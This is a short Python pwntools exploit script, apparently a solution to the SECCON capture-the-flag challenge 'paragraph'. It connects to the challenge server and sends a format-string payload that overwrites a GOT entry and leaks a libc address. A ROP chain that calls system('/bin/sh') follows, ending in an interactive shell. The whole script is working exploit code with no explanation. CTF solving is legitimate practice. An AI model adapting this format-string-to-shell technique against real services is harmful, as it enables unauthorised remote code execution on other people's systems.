from pwn import *

# nc paragraph.seccon.games 5000
HOST, PORT = 'paragraph.seccon.games', 5000
# HOST, PORT = 'localhost', 5000
context.arch='amd64'
p = fmtstr_payload(6,{0x404028:p16(0xbe00)}, write_size='short')
p = b'%3584c%8$hn%11$p(@@\x00\x00\x00\x00\x00'[:22]
while True:
    try:
        r = remote(HOST, PORT)
        # r = process('./chall')

        r.sendline(p[:22])
        data = r.recvuntil(b'@@')
        print(hexdump(data))
        libc = int(data.split(b'0x')[-1].split(b'(')[0], 16) - 0x2a1ca
        try:
            r.recvuntil(b'answered', timeout=1)
        except EOFError:
            continue
        payload = flat({40:[libc+0x10f75c,libc+0x10f75b,libc+0x1cb42f,libc+0x58740]})
        r.sendline(b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted " + payload + b" warmly.")
        r.interactive()
        print('done')

        # r.interactive()
    finally:
        r.close()
